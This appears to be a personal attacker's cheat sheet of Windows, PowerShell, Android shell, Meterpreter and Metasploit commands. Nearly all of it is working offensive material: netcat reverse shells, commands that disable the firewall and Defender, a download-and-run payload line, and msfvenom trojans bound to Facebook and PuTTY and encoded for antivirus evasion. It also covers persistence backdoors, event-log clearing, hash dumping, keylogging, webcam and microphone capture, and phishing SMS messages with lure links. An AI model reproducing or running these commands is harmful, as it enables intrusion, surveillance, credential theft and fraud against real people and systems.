netsh wlan show profile "enter a ssid" key=clear           "to see info and password in clear text of that network" 

net user "nameof user /delete    "to delete user"

net user bob password /add  "to add user with the name of bob and password of password

net localgroup administrators bob /add     "to make it a admin account"

net user bob 123456  "to change password to 123456"

#change a usrs password
net user "to see all users on pc"

net user "user name" *     "to change password for that user"


whoami    "to see your user id and pc hostname"

tasklist   "see all running tasks on the pc"

taskkill -pid  "process id"   or taskkill -im iexplore.exe     "to kill a ytask ot program"




start firefox http://10.0.0.15:3000/demos/butcher.index     "start a beef hooked page lan"


start firefox http://71.58.122.35:3000/demos/butcher.index     "start a beef hooked page wlan"





"if they have netcat"

ncat -nv 10.0.0.15 7878 -e cmd.exe       "start a lan reverse shell"

ncat -nv 71.58.122.35 7777 -e cmd.exe     "start a wlan reverse shell"


#TRUNING OFF WINDOWS Defenses


#disable windows firewall

netsh advfirewall set currentprofile off




TURN OFF WINDOWS DEFENDER

"run in powershell as admin lvl" 

Set-MpPreference-DisableRealTimeMonitoring $true

Set-MpPreference -DisableIOAVProtection $true

"C:\Programs files\windows defender\mpcmdrub.exe" -RemoveDefintions -All Set-MpPreference -DisableIOAVProtection $true


"then add path enclsion to keep it contained"

windows powershell

"Add-MpPreference -ExclusionPath "C:\"


if fails try not using power shell to add path enclusion.



************************************************************************************

download files using powershell


(New-Objext System.Net.WebClient).DownloadFile("http://192.168.1.212/payload.exe", "C:\Windows\Temp\payload.exe")

start filename.exe





************************************************************************************************88
#METERPRETER COMMANDS

arp

cat "and the file name to see file contents" 

info

read

shutdown 

reboot

irb

edit

machine_id 

load sound

load incognito

resource

"open old shell that has backdoor "exploit -j -z"

route                    "shows all network device is connected to"

getsystem

wake

bgrun 

bglist

bgkill

sleep

hide_app_icon

wakelock

help

sessions

sessions -i

shell

host

checksum

cp

rm

mv

id

cd

cd /

cd..

ls

cd storage

ls

cd extSdCard

ls

dir

del         rm

edit

mkdir

rmdir

download     download -r

upload       

lcd

getlwd

gettwd

pwd

cat

run

reg

timestomp

bglist

channel

interact

transport

read

run kill.rb

serach -f*.mp4     serach -d . -f *.txt

sysinfo

ipconfig

ifconfig

ping        ping 10.0.0.1      ping 192.168.0.1

netstat      netstat -a    netstat -ano | grep LISTEN

lsod -nPi

portfwd     

check

ps

getuid

execute 

activity_start

sqlie_query

sqlite_query -d /data/data/com.android.browser/databases/webviewCookiesChromium.db -q 'SELECT * from cookies'

localtime i

set_audio_mode

wakelock     'Enable/Disable Wakelock'

interval_collect   "example"   interval_collect -c geo -d 15 -a start     interval_collect -c geo -a stop   " to collect geo loaction data over time"

dump_sms     

dump_calllog

dump_contacts

localtime 

geolocate

lan_geolocate

wlan_geolocate

activity_start tel:12323333

activity_start content://contacts/people/1

send_sms

send_sms -d +918386866885  -t "hacked" 

send_sms -d +17173798497 -t "check out this cool app it has a bunch of new free movies and tv shows and links to websites that host movies and ITS FREE no more netflix heres the apps website to download it youre welcome ;) http:///www.%2FFreeMoviesandTV.com%2FShow+Box%2FShowBoxdownload.html"

send_sms -d +918386866885 -t check out this awesome free movie app and site I found just download the app it has every movie and tv show ever for FREE you can download it here https://grabify.link/QEYB9F

webcam_list

webcam_snap -i 2      webcam_snap -| 2      webcam_snap 2      

webcam_snap

webcam_stream -i 2        webcam_stream -i 2       webcam_stream -|2

webcam_chat

cd stroage

record_mic -d 30        record_mic

screenshot

hashdump

check root

execute

getprivs

reboot

device_shutdown     shutdown

rev2self

idletime

keyscan_start

keyscan_dump

keyscan_stop

uictl

exit

backgroud

getpid

load powershell    "to load the powershell extion an enable powershell commands"

ps "to check process"  migrate "ppid of lsass"  "to make the shell stronger and less dectactable  migrate to process lsass.exe or explorer.exe"

run persistence -h                      "get help list"

run persistence -X     "sends a shell signal at pcs boot up set listner to port 4444"

run persistence -p 4444 -r 10.0.0.170

run persistence -A

run persistence -U -i 5 -p 443 -r 10.0.0.15

run persistence -X -i 5 -p 443 -r 10.0.0.15

run persistence -S -i 5 -p 443 -r 10.0.0.15

run persistence -h              

run persistence -A -L c:\\ -X 30 -p  443 -r "target ip address"

run metsvc      "to install a back door take note of what port backdoor uses"

run metsvc -A   "auto start backdoor"

run vnc        "run vnc to see live screen stream"


portfwd add -| 4444 -p 4444 -r target


#how to pivot   "background the session you want to pivot from with ctrl Z then type"

route add "target ip to route to" 255.255.255.255.0 "then type session ID to pivot from" then use exploit to hack targeted device

use exploit/windows/smb/ms08_067_netapi     set RHOST "traget ip"


clearev        "CLEAR YOUR TRACKS DONT GET CAUGHT this clears the event log"

*********************************************************************
#multihandler options

#android

use mutli/handler

set AndroidHideAppIcon true

set AutoSystemInfo true

set AutoUnhookProcess true

(all Options)
  AndroidHideAppIcon R -o
  AndroidHideAppIcon           false
  AndroidMeterpreterDebug      false
  AndroidWakelock              true
  AutoLoadStdapi               true
  AutoRunScript                
  AutoSystemInfo               true
  AutoUnhookProcess            false
  AutoVerifySession            true
  AutoVerifySessionTimeout     30
  ContextInformationFile       
  DisablePayloadHandler        false
  EnableContextEncoding        true
  EnableEncodedStager          true
  EnableStageEncoding          false
  EnableUnicodeEncoding        false
  Encoding                     x86/shikata_ga_nai
  ExitOnSession                true         HandlerSSLCert                                          
  InitialAutoRunScript         
  Iterations                   15
  LHOST                        192.168.1.220
  LPORT                        443
  ListenerTimeout              0
  PAYLOAD                      android/meterpreter/reverse_tcp
  PayloadProcessCommandLine    
  PayloadUUIDName              
  PayloadUUIDRaw               
  PayloadUUIDSeed              
  PayloadUUIDTracking          false
  ReverseAllowProxy            false
  ReverseListenerBindAddress   
  ReverseListenerBindPort      
  ReverseListenerComm          
  ReverseListenerThreaded      false
  SessionCommunicationTimeout  300
  SessionExpirationTimeout     604800
  SessionRetryTotal            3600
  SessionRetryWait             10
  StageEncoder                 
  StageEncoderSaveRegisters    
  StageEncodingFallback        true
  StagerRetryCount             10
  StagerRetryWait              5
  VERBOSE                      false
  WORKSPACE                    
  WfsDelay

*****************************************
*******************************************************************************************
#windows cmd commads 

type    "see inside a file"


cd C:\      "goto c drive"


ipconfig   "get network info for that pc"


systeminfo    "shows all sys info"


netsh wlan show profiles     "shows saved wifis"


netsh wlan show profile "profile name" key=clear     "see wifi info with password in clear text"


shutdown -r     "restart the pc"


arp -a       "get saved privte ip address on the network of the hacked pc"


netstat -a                 "see all active connections"


whoami         "see what user you are"


net user      "get user info"


start      "start a program use program name after start"

start firefox      "start firefox add a url to open to that website"


#create new user with cmd shell "for prestance or psexec exploit"

net user "bob" password /add  "to create account with the name of bob password pass

net localgroup administrators "bob" /add     "to make it a admin account"

net user bob 123456  "to change password to 123456"

#change a usrs password
net user "to see all users on pc"

net user "user name" *     "to change password for that user"



#Trun Off Windows Defender
#command to disable win defender on cmd

"C:\programs files\windows defender\mpcmdrun.exe" -RemoveDefintions -All Set-MpPreference -DisableIOAVProtection $true





then add exlusion path to keep it off and contained

windows powershell

"Add-MpPreference -ExclusionPath "c:\"





if failed try this "out of powershell"

Add-MpPreference -ExclusionPath "c:\"



********************************************************************************************
#android shell commands

install a apk file              "adb install /sdcard/update.apk"

go to home screen    input keyevent 3


google search by entering text on home screen   input keyevent 3    input text 'what%you%want%tosearch'


vol down 1    "input keyevent 24" 


vol up one    "input keyevent 25"


press enter     input keyevent 66


make text     input text 'hello%world%how%are%you'


kill a task    killtask "PID number"


see all apps     pm list packages       "hit pm for help"


see all apps plus files     pm list package -f

 
hit am for help


start a app     am "apps name"    "am update.apk"


open a web page by pass defult broswer      am start -n org.mozilla.firefox/.App http//:www.google.com


open a beef page bypass defult broswer     am start -n org.mozilla.firefox/.App http//71.35.122.58:3000/demos/basic.html


open a beef webpage    am start -a amdroid.imtent.action.VEIW -d "http://www.71.58.1222.35:3000/demos/basic.html"

open a webpage     open a beef webpage    am start -a android.imtent.action.VEIW -d "http://www.google.com"
****************************************************************************
#set up persistance   "backgroud session and type 

use post/windows/manage/persistance

set LPORT 

set LHOST

set rexe "make a trojan named ciauz.exe drag it here"

exploit

**** how to pivot  ******

control Z to backgroud session


route add "target ip" "255.255.255.0" "and session id to pivot from"




use windows/smb/08_067_netapi or another exploit

***********************************************************************************

upload 2nd trojan to target

cd cd /sdcard/

upload '/root/Desktop/LookoutAndroidAntiVirus.apk' /sdcard/ 

"port443"



*********************************************************************
#upload backdoor easy way save to cd/ cd etc cd init.d or in sdcard


cd / 

cd / etc 

cd / etc / init.d

*****"or save to"*******

cd

cd / sdcard

upload '/root/Desktop/Androidupdate.sh' /sdcard/


"or"


upload '/root/Desktop/AndroidBackdoor.sh'  /sdcard/




shell

cd /

cd / sdcard

sh Androidupdate.sh

nohup sh Androidupdate.sh

"and or"

sh AndroidBackdoor.sh

nohup sh AndroidBackdoor.sh


"you want it to return starting: intent after you run the backdoor"
*************************************************************
cd /

ls

cd / etc  

ls 

cd / init.d  

upload '/root/Desktop/AndroidBackdoor.sh' /sdcard/

cd sdcard          cd storage

cd download

ls         "find your apk
'

upload AndroidBackdoor.sh

cd download   "check for backdoor upload"

shell

cd /

ls

cd sdcard

ls

cd download           "find back door in shell"

ls

sh Android Backdoor.sh    "press control c"


exit

exploit     "must upload backdoor to cd /sdcard/ or cd /etc/init.d if root for presitance"
*******************************************************************************************************************************
#Windows Persistance mesures 
#create new user with cmd shell "for prestance or psexec exploit"

net user "bob" password /add  "to create account with the name of bob password pass

net localgroup administrators "bob" /add     "to make it a admin account"

net user bob 123456  "to change password to 123456"

#change a usrs password
net user "to see all users on pc"

net user "user name" *     "to change password for that user"

**********************************************************************************
#open broswer to beef hooked phining page  from windows shell "CMD"

start firefox 71.58.122.35

start firefox 10.0.0.170

#start broswer to beef hooked showbox page

start Firefox http://71.58.122.35:12345/www.%2FFreeMoviesandTV.com%2FShow+Box%2FShowBoxdownload.html

#open to beef demo page 

start firefox http://10.0.0.15:3000/demos/basic.html

****start a beef hooked page on android*****
#open beef demo wlan

activity_start intent://71.35.122.58:3000/demos/basic.html#Intent;scheme=http;action=android.intent.action.VEIW;end


#open show box hooked phising page wlan

activity_start intent://http://71.58.122.35:12345/www.%2FFreeMoviesandTV.com%2FShow+Box%2FShowBoxdownload.html#Intent;scheme=http;action=android.intent.action.VEIW;end

#open to hooked phising page 

activity_start intent://71.35.122.58#Intent;scheme=http;action=android.intent.action.VEIW;end



***************************************************************************************************************************

#remote dns spoofing by editing windows host file

host file location C:\WINDOWS\system32/drivers/etc/hosts

cd C:\

cd / windows

cd / drivers

cd / etc etc

ls

rm hosts host.old

upload   "insert file"   C:\windows\system32/drivers/etc/

*******************************************************************
post mods

run post/windows/garther/enum_applications  "see all programs running"


run post/multi/recon/local_exploit_suggester      "this will let use know if the system is exploitable to other exploits"


run post/windows/gather/cerdentials/credential_collector   "get sys info hashes admin pass etc"   "to crack hashes use hashcat!"

"hashcat in termianl to crack hashes" 




run post/windows/gather/
checkvm       "see if pc is a vm"


post/windows/gather/phish_windows_credentials  "lunches a phishing pop up asking for user creds to contuine using the pc"


*****************************************************************************************

get vnc viewer control

"set your payload to"

set PAYLOAD windows/vncinject/reverse_tcp

show options

set VeiwOnly false


********************************************************************************************

#hack mac linux unix windows device with a link and with metasploit

use exploit/mutli/java_jre17_jmxbean_2

set LHOST 10.0.0.224

set SRVHOST 10.0.0.224

set SRVPORT 443

set URIPATH /

set PAYLOAD java/meterpreter/reverse_tcp

exploit


******************************************************************************************************************
#browser exploits for metasploit"

"HTA attack"

use exploit/windows/misc/hta_server

set SRVHOST 10.0.0.224

set URIPATH /Update

exploit






use exploit/windows/browser/ms10_046_shortcut_icon_dllloader

set PAYLOAD windows/meterpreter/reverse_tcp

set LHOST 10.0.0.15

set SRVHOST 10.0.0.15

set SRVPORT 80

set URIPATH /

exploit




use auxiliary/server/browser_autopwn

set LHOST 10.0.0.15

set URIPATH google

exploit




use exploit/multi/script/web_delivery

set PAYLOAD windows/meterpreter/reverse_tcp

set LHOST 10.0.0.15

set LPORT 443

set URIPATH /google

set TARGET 2          "show targets"

exploit







use exploit/windows/http/badblue_passthru

set RPORT 80

set RHOST "target ip address"

exploit


use windows/broswer/adobe_flash_amv2

set RHOST 

exploit



use exploit/multi/browser/firefox_xpi_bootstrapped_addon

set SRVHOST 10.0.0.16

set URIPATH /

set LPORT 80

exploit

**********************************************

#windows maloius pdf "may be used for android"
 
use windows/fileformat/adobe_pdf_embedded_exe_nojs

set PAYLOAD windows/meterpreter/reverse_tcp

set LHOST 10.0.0.15

set LPORT 443

set FILENAME Urgent_New_Agenda443.pdf

exploit

"set up hanlder with windows payoad setting and port used in pdf and local ip"


******************************************
maloius pdf payload 


use windows/fileformat/adobe_pdf_embedded_exe

set PAYLOAD windows/meterpreter/reverse_tcp

set LHOST 192.168.1.

set LPORT 443

set FILENAME pdftest.pdf

set INFILENAME "drag a pdf file here"

exploit

"set up hanlder with windows payoad setting and port used in pdf and local ip"

**********************************************************************************************************************
#set a auto run script to run right at connection of shell

add this to options


set AutoRunScript post/windows/manage/smart_migrate

generate -t vba      "copy output"

***************************************************************************************************************************8

#MAKE PAYLOAD APKS
#lan mode
***********************************************************
#basic apk payload "set payload to reverse_https and use port 443 to get past firewalls"

msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.0.64 LPORT=4444 R > /root/Facebook.apk


#WLAN msfvenom -p android/meterpreter/reverse_tcp LHOST=71.58.122.35 LPORT=443 R > /root/Android.apk



************************
**************************
#with encoding

msfvenom -p android/meterpreter/reverse_tcp -e x86/opt_sub -i 3 LHOST=10.0.0.15 LPORT=4444 R > /root/Desktop/Facebook.apk

********************************************************
Metasploit shell code apks 

msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.212 LPORT=443 AndroidHideAppIcon R > -o /root/AutoHide.apk

msfvenom -p android/meterpreter/reverse_https -f apk LHOST=71.58.126.12 LPORT=443 R > /root/https.apk

msfvenom -p android/meterpreter/reverse_http --platform android -f apk LHOST=192.168.1.220 LPORT=8080 R > /root/http.apk


msfvenom -p android/meterpreter_reverse_tcp --platform android -f apk LHOST=192.168.1.220 LPORT=443 R > /root/rev2.apk


msfvenom -p android/meterpreter/reverse_tcp LHOST=71.58.122.35 LPORT=4444 R > /root/Desktop/Update.apk


************************************************************
wlan
msfvenom -p android/meterpreter/reverse_tcp LHOST=71.58.122.35 LPORT=445 R > /root/Update.apk

msfvenom -p android/meterpreter/reverse_https LHOST=10.0.0.66 LPORT=443 R > /root/ShowBox.apk


***********************************************************

#bind android payload with metasploit

apt-get install lib32stdc++6 lib32ncurses5 lib32zl

apt-get install zipalign

msfvenom -x /root/Facebooklite.apk -p android/meterpreter/reverse_tcp LHOST=192.168.1.212 LPORT=443 -o /root/Facebook.apk

"if this fails goto the root folder place the real apk there then run the msfvenom script"


msfvenom -x FacebookLite.apk -p android/meterperter/reverse_tcp LHOST=71.58.122.35 LPORT=443 - o Facebook.apk

**************************************************

#bind payload to apk wlan mode

ruby apk-embed-payload.rb "name of app".apk -p android/meterpreter_reverse_tcp LHOST=10.0.0.170 LPORT=443



msfvenom -x Facebook Lite.apk -p android/meterpreter/reverse_tcp LHOST=71.58.122.34 LPORT=4444 -e x86/opt_sub -i 5 -o Facebook.apk

ruby apk.rb Facebook lite -p android/meterperter/reverse_tcp LHOST=10.0.0.170 LPORT=4444


#bind apk to payload 

start terminal as super user open and type su

msfvenom -x  exec: msfvenom -x /root/Desktop/Facebook Lite_v90.0.0.10.180_apkpure.com.apk -p android/meterpreter/reverse_tcp LHOST=71.35.122.58 LPORT=443 -o Facebook.apk -p android/meterpreter/reverse_tcp LHOST=71.35.122.58 LPORT=443 -o Facebook.apk

******************************************************************************************************************************************
#ngrok msfvenom android payload this can work for wwindows to.

./ngrok tcp 1234          

copy ngrok like use as l host or type the host + link to get ngrok tunnes ip and use that as lhost     " ngrok link example   0.tcp.ngrok.io:11084     " use the port given by ngrok example to get ngrok tunnel ip   "   host 0.tcp.ngrok.io   " or ping 0.tcp.ngrok.io "


msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io:11084 LPORT=11084 R > /root/payload.apk

or

msfvenom -p android/meterpreter/reverse_tcp LHOST=52.14.61.47 LPORT=11084 R > /root/payload.apk


set your multi/handler as so

use multi/handler

set LHOST 0.0.0.0

set LPORT 1234

set PAYLOAD android/meterpreter/reverse_tcp



*********************************************************************************************************
#metasploit multi device hacking php shell code script

msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.64 LPORT=8080 R > /root/Desktop/PHP404.php

must use php/meterpreter/reverse_tcp payload on multi handler
**************************************************************************************************************\
#python msfvenom payload "can be used with NXcrypted""listed from most detectable to least detectable"


"basic"
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.212 LPORT=443 -o /root/test.py



"encoded"
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.212 LPORT=443 -e x86/shikata_ga_nai -i 15 -o /root/test.py



"encoded and ecrypted"
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.212 LPORT=443 -e x86/shikata_ga_nai -i 15 --encrypt aes256 -b -o /root/test.py



"encoded, encrypted and bad chars removed"
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.212 LPORT=443 -e x86/shikata_ga_nai -i 15 --encrypt aes256 -b \x00\xff\x00\x0a -o /root/test.py



"max av evasion"

"Encytpion types" "encoding types"
aes256              x86/opt_sub
base64              x86/bloxor
rc4                 x86/xor
xor                 x86/shikata_ga_nai


msfvenom -p python/meterpreter/reverse_https LHOST=192.168.1.212 LPORT=443 -e x86/shikata_ga_nai -i 15 --encrypt aes256 -b \x00\xff\x00\x0a -o /root/test.py

msfvenom -p python/meterpreter/reverse_rc4 LHOST=192.168.1.212 LPORT=443 -e x86/shikata_ga_nai -i 15 --encrypt aes256 -b \x00\xff\x00\x0a -o /root/test.py  
 



"use encoded multi handlerfor max avbypassing results also try https and rc4 payloads"


use multi/handler

set PAYLOAD python/meterpreter/reverse_tcp

set LPORT 443

set LHOST 192.168.1.212

set EnableStagedEncoding true

set Encoding x86/shikata_ga_nai

set Iterations 15

exploit



***********************************************************************************************
encoded windows trojans scripts
***************************************************************************************
#REAL ENCODING SCRIPT!  #encoded msf payloads
#how to make undetecabale trojans"set payload to reverse_https and use port 443 to get past firewalls"




msfvenom -p windows/meterpreter/reverse_https --platform windows -a x86 --encrypt aes256 LHOST=10.0.0.235 LPORT=443 -f exe -e x86/shikata_ga_nai -i 5 > /root/SHELL.exe



msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 LHOST=192.168.1.212 LPORT=445 -f exe -e x86/opt_sub -i 5 > /root/Desktop/EncryptedEvilTest.exe



msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 LHOST=192.168.1.212 LPORT=443 -f exe -e x64/xor -i 10 > /root/Desktop/EncryptedEvilTest.exe



msfvenom -p windows/meterpreter/reverse_https --platform windows -a x86 LHOST=10.0.0.16 LPORT=443 -f exe -e x86/opt_sub -i 5 > /root/Desktop/EncryptedEvilTest.exe



msfvenom -p windows/meterpreter/reverse_https --platform windows -a x86 LHOST=10.0.0.15 LPORT=443 -f exe -e x86/shikata_ga_nai -i 25 R > /root/Desktop/EncryptedEvilTest.exe



msfvenom -p windows/meterpreter/reverse_https  --platform windows -a x86 LHOST=10.0.0.15 LPORT=443 -f exe -e x64/xor -i 15 -b \x00\xff R > /root/Desktop/EncryptedEvilTest.exe



#WLAN

msfvenom -p windows/meterpreter/reverse_tcp LHOST=71.58.122.35  --platform windows -a x86 LPORT=4444 -f exe -e x86/opt_sub -i 6 R > /root/Desktop/EncryptedEvilTest.exe



msfvenom -p windows/meterpreter/reverse_tcp LHOST=71.58.122.35  --platform windows -a x86 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 25 R > /root/Desktop/ScammerSlammer.exe



msfvenom -p windows/meterpreter/reverse_tcp LHOST=71.58.122.35  --platform windows -a x86 LPORT=445 -f exe -e x86/opt_sub -i 6 R > /root/Desktop/Taxes2015.exe


"use encoded multi handler for max avbypassing results also try https and rc4 payloads"


use multi/handler

set PAYLOAD python/meterpreter/reverse_tcp

set LPORT 443

set LHOST 192.168.1.212

set EnableStagedEncoding true

set Encoding x86/shikata_ga_nai

set Iterations 15

exploit

*******************************************************************************

******************************************************************************
#windows Trojans Scripts


msfvenom -p --platform windows -a x86 -p windows/meterpreter/reverse_tcp LHOST=10.0.0.15 LPORT=443 -f exe -o /root/Desktop/EVIL.exe


how to make a windows trojan lan mode

msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=10.0.0.15 LPORT=443 -o /root/Desktop/Trojan.exe


windows shell exe wlan mode.

msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=71.58.122.35 LPORT=443 -o /root/Desktop/Internet_Explorer.exe

  
msfvenom -p windows/meterpreter/reverse_tcp LHOST=71.58.122.35 --platform windows -a x86 LPORT=443 -f exe > /root/Desktop/Internet_Explorer.exe



#LAN Mode "set payload to reverse_https and use port 443 to get past firewalls"


msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.15 --platform windows -a x86 LPORT=443 -f exe > /root/Desktop/Internet_Explorer.exe


#LAN TROJAN
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=10.0.0.15 LPORT=443 -o /root/Desktop/EvilTrojan.exe


***************************************************************************************
#bind real exes to metasploit msfvenom payloads
#Non Encoded

msfvenom -p windows/meterpreter/reverse_tcp -k --platform windows -a x86 -f exe LHOST=10.0.0.180 LPORT=443 -x '/root/Desktop/putty.exe' -o /root/puttty.exe


#bind exe with encoded msfvenom payload


msfvenom -p windows/meterpreter/reverse_tcp -k --platform windows -a x86 -f exe LHOST=10.0.0.180 LPORT=443 -e x86/shikata_ga_nai -i 15 -x '/root/putty.exe' -o /root/putty.exe

***********************************************************************************************************
#create msfvenom payload in the raw with encoding/encryption & bad chars can be used to bind with another exe


msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.212 LPORT=443 -e x86/shikata_ga_nai -i 15 -f raw > /root/putty.bin


msfvenom -p - -x '/root/putty.exe' -k -f exe -a x86 --platform windows -e x86/bloxor -i 5 > puttytest.exe < putty.bin


#bind raw encoded payload to a real exe and encode that

"or"


msfvenom -p windows/meterpreter/reverse_tcp -f raw LHOST=192.168.1.212 LPORT=443 -e x86/shikata_ga_nai -i 15 --encrypt aes256 -b \x00\xff\x00\x0a -o /root/putty.bin

msfvenom -p - -x '/root/putty.exe' -k -f exe -a x86 --platform windows -e x86/bloxor -i 5 > puttytest.exe < putty.bin

***************************************************************************
use these msfvenom scripts for max av evasion use a encoded stager as well and a rc4 or https payload for max results 
encoded and encrypted windows msfveom trojans with chars removed to try to hide signautre
"less detectable msfvenom payloads"

"Encytpion types"
aes256
base64
rc4
xor


msfvenom -p windows/meterpreter/reverse_https --platform windows -a x86 LHOST=192.168.1.218 LPORT=443 -f exe -e x86/shikata_ga_nai -i 15 --encrypt aes256 --key key -o /root/EncodedEncrytped.exe



msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 LHOST=192.168.1.220  LPORT=443 -f exe -e x86/shikata_ga_nai -i 15 --encrypt xor -o /root/EncodedEncrytped.exe


msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 LHOST=192.168.1.220  LPORT=443 -f exe -e x86/shikata_ga_nai -i 15 --encrypt rc4  --encrypt-key mykey -o /root/EncodedEncrytped.exe



msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 LHOST=192.168.1.220 LPORT=443 -f exe -e x86/opt_sub -i 20 --encrypt aes256 -b \x00\xff\x00\x0a R > /root/encodedencypted.exe



msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 LHOST=192.168.1.220  LPORT=443 -f exe -e x86/shikata_ga_nai -i 15 --encrypt aes256 -b \x00\xff\x00\x0a -o /root/EncodedEncyrtped.exe



msfvenom -p windows/meterpreter/reverse_https --platform windows -a x86 -f exe x64/xor -i 20 LHOST=192.168.1.212 LPORT=443 --encrypt aes256 -b \x00\xff\x00\x0a R > /root/EncryptedEvilTest.exe


msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=192.168.1.212 LPORT=443 -e x86/shikata_ga_nai -i 20 -b \x00\xff\x00\x0a --encrypt aes256 -o /root/putty.exe


msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=192.168.1.212 LPORT=443 -e x86/bloxor -i 20 -b \x00\xff\x00\x0a --encrypt aes256 -o /root/putty.exe


msfvenom -p windows/meterpreter/reverse_tcp -k --platform windows -a x86 -f exe LHOST=192.168.1.212 LPORT=443 -e x86/xor -i 10 -b \x00\xff\x00\x0a --encrypt aes256 -o /root/putty.exe




"binded encoded and ecytped"
msfvenom -p windows/meterpreter/reverse_https -k --platform windows -a x86 -f exe LHOST=192.168.1.218 LPORT=443 -e x86/shikata_ga_nai -i 20 --encrypt xor -x '/root/PuTTY.exe' -o /root/putty.exe



"use encoded multi handler for max avbypassing results also try https and rc4 payloads"


use multi/handler

set PAYLOAD python/meterpreter/reverse_tcp

set LPORT 443

set LHOST 192.168.1.212

set EnableStagedEncoding true

set Encoding x86/shikata_ga_nai

set Iterations 15

exploit


"shellcode chars that can be removed to change a payloads signature to try to evade av"

\xd5\x50\x6a\xeb\x18\x5e\x8d\x29\xc0\xdb\x8a/x1c\x06\x80\\xfb\x02\x74\x0e\xf3\x11\x47\x40\xe8\xbd\x98\xd1\xb5\x42\x10\x21\xe9\xc7\x6c\


******************************************************************************************************************
"how to make msfvenom powershell payload"

#non encoded

msfvnom -p cmd/windows/reverse_powershell LHOST=10.0.0.224 LPORT=443 > /root/PowershellAttack.txt


#encoded 

msfvenom -p cmd/windows/reversepowershell LHOST=10.0.0.224 LPORT=443 -e cmd/powershell_base64 -l 15 > /root/EncodedPowerShellAttack.txt


"use encoded multi handler for max avbypassing results"


use multi/handler

set PAYLOAD python/meterpreter/reverse_tcp

set LPORT 443

set LHOST 192.168.1.212

set EnableStagedEncoding true

set Encoding x86/shikata_ga_nai

set Iterations 15

exploit

***************************************************************************************************************************
#make a metasploit pdf payload



use exploit/windows/filefprmat/adobe_pdf_embedded_exe


set PAYLOAD windows/meterpreter/reverse_tcp


set LPORT 443


set LHOST 10.0.0.15


set FILENAME Payrole 2018


exploit


************************************************************************************************
#make a metasploit msfvenom php payload 

"non encoded php payload"
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.224 LPORT=8080 -f php R > /root/404.php


"encoded php payload"
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.224 LPORT=8080 -e  php/base64 -l 15 -f php R > /root/404.php


********************************************************************************************************
#mac Macho MSFVenom Payload hack macs


"mac Basic Trojan"

msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.0.0.224 LPORT=443 -f macho > macvirus.macho




"encoded mac trojan"

msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.0.0.224 LPORT=443 -f macho -e x86/shikata_ga_nai -i 15 > macvirus.macho




"payload for macs are"
osx/x86/meterpreter_reverse_tcp

osx/x86/shell_reverse_tcp

*******************************************************************************************************************************
#Hack MAcs or UNIX with MSFVENOM Payload


"to use copy and paste into termianl"
msfvenom -p unix/cmd/reverse_python LHODT=10.0.0.224 LPORT=443 -f raw > /root/shell.py


msfvenom -p unix/cmd/reverse_python LHOST=10.0.0.224 LPORT=443 -f python > /root/shell.py


"payload for macs are"
osx/x86/meterpreter/reverse_tcp

osx/x86/shell_reverse_tcp

*****************************************************************************************
#START HANDLER with encoding and exit on session false

use multi/handler


set PAYLOAD windows/meterpreter/reverse_tcp


set LPORT 4444


set LHOST 10.0.0.15


set Encoder x86/shikata_ga_nai


set Iterations 10


set exitonsession false


exploit

**************************************************************************

#windows 7,8 & 10 exploit psexec

use exploit/windows/smb/psexec

set RHOST "target ip"
set SMBDOMAIN "Network domain name"
set SMBUSER "username"
set SMBPASS "Password for smb"
set PAYLOAD windows/meterpreter/reverse_tcp
set LPORT
set RPORT

exploit



use exploit/windows/smb/psexe_psh

set RHOST "target ip"
set SMBDOMAIN "Network domain name"
set SMBUSER "username"
set SMBPASS "Password for smb"
set PAYLOAD windows/meterpreter/reverse_tcp
set LPORT
set RPORT

exploit

**************************************************************************************************************************************
#exploits for metasploitable / linux / unix / servers / etc

use exploit/unix/ftp/vsftpd_234_backdoor

set RHOST 10.0.0.139

exploit



use exploit/unix/irc/unreal_ircd_3281_backdoor

set RHOST 10.0.0.139

exploit
 


use exploit/multi/http/php_cgi_arg_injection

set RHOST 10.0.0.94

exploit


use exploit/linux/misc/drb_remote_codeexec

set  URI druby://10.0.0.94:8787

exploit



use exploit/multi/samba/usermap_script

set RHOST 192.168.1.238

exploit


use exploit/unix/msic/distcc_exec

set RHOST 10.0.0.139

exploit



use exploit/multi/misc/java_rmi_server

set RHOST 10.0.0.139

exploit



use exploit/unix/webapp/twiki_history

set RHOST 10.0.0.94

exploit



use auxiliary/scanner/ssh/ssh_login

set RHOST 10.0.0.94

set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt

set VERBOSE false

run

**************************************************************************************************************************************
#Windows server exploits

use exploit/windows/smb/smb_relay

set SMBHOST "target ip"

set PAYLOAD windows/meterpreter/reverse_tcp

set LHOST 10.0.0.16

exploit


*****************************************************************************
#windows xp exploit 

use windows/smb/ms08_067_netapi

set RHOST "target ip"

exploit
***************************************************************************************
#eternal BLUE! NSA exploit! works on winds 7 and maybe 8 "unconfrimed for win8" and windows server 2008

search eternalblue

exploit/windows/smb/ms17_010_eternalblue

set PAYLOAD windows/x64/meterperter/reverse_tcp

set RHOST 

set RPORT 445

exploit

######################################################################################
radom exploits

use exploit windows/smb/ms06_66_nwapi


